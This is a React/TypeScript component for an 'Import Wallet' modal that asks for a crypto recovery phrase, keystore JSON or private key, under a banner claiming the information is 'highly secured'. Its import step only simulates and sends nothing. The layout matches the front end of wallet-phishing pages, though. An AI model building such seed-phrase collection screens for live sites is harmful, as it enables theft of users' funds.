"use client";

import React, { useState, useEffect, useRef } from "react";
import Button from "./Button";

interface Wallet {
  id: string;
  name: string;
  icon: string;
  category: "popular" | "defi" | "hardware" | "mobile";
}

interface ImportWalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  selectedWallet: Wallet | null;
  onWalletModalClose?: () => void;
}

const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
  isOpen,
  onClose,
  selectedWallet,
  onWalletModalClose,
}) => {
  const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "private">(
    "phrase"
  );
  const [phrase, setPhrase] = useState<string>("");
  const [isImporting, setIsImporting] = useState<boolean>(false);
  const hasClosedWalletModal = useRef<boolean>(false);

  // Close wallet modal when import modal opens (only once)
  useEffect(() => {
    if (isOpen && onWalletModalClose && !hasClosedWalletModal.current) {
      hasClosedWalletModal.current = true;
      onWalletModalClose();
    }
  }, [isOpen, onWalletModalClose]);

  // Reset the flag when modal closes
  useEffect(() => {
    if (!isOpen) {
      hasClosedWalletModal.current = false;
    }
  }, [isOpen]);

  const handleImport = async () => {
    if (!phrase.trim()) return;

    setIsImporting(true);

    // Simulate import process
    setTimeout(() => {
      setIsImporting(false);
      onClose();
      // You can add success notification here
    }, 2000);
  };

  if (!isOpen || !selectedWallet) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center">
      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/50 backdrop-blur-sm"
        onClick={onClose}
      />

      {/* Modal */}
      <div className="relative bg-white rounded-2xl shadow-2xl max-w-md w-full mx-4 overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between p-6 border-b border-gray-200">
          <div className="flex items-center space-x-3">
            <span className="text-2xl">{selectedWallet.icon}</span>
            <h2 className="font-heading text-xl font-bold text-gray-900">
              Import {selectedWallet.name}
            </h2>
          </div>
          <button
            onClick={onClose}
            className="p-2 hover:bg-gray-100 rounded-lg transition-colors"
          >
            <svg
              className="w-6 h-6 text-gray-500"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M6 18L18 6M6 6l12 12"
              />
            </svg>
          </button>
        </div>

        {/* Tabs */}
        <div className="border-b border-gray-200">
          <div className="flex">
            {[
              { id: "phrase", label: "PHRASE" },
              { id: "keystore", label: "KEYSTORE JSON" },
              { id: "private", label: "PRIVATE KEY" },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={`flex-1 px-4 py-3 text-sm font-medium transition-colors ${
                  activeTab === tab.id
                    ? "text-primary-purple border-b-2 border-primary-purple"
                    : "text-gray-500 hover:text-gray-700"
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>
        </div>

        {/* Content */}
        <div className="p-6">
          {/* Security Message */}
          <div className="mb-4 p-3 bg-green-50 border border-green-200 rounded-lg">
            <p className="text-green-700 text-sm font-medium">
              Your information is highly secured
            </p>
          </div>

          {/* Input Area */}
          <div className="mb-4">
            <textarea
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              placeholder="phrase"
              className="w-full h-32 p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 resize-none"
            />
          </div>

          {/* Instructions */}
          <p className="text-gray-600 text-sm mb-6">
            Typically 12 (sometimes 24) words separated by single spaces.
          </p>

          {/* Import Button */}
          <Button
            onClick={handleImport}
            disabled={!phrase.trim() || isImporting}
            className="w-full  text-white py-3 px-4 rounded-lg font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center justify-center"
          >
            {isImporting ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                Importing...
              </>
            ) : (
              "IMPORT"
            )}
          </Button>
        </div>
      </div>
    </div>
  );
};

export default ImportWalletModal;
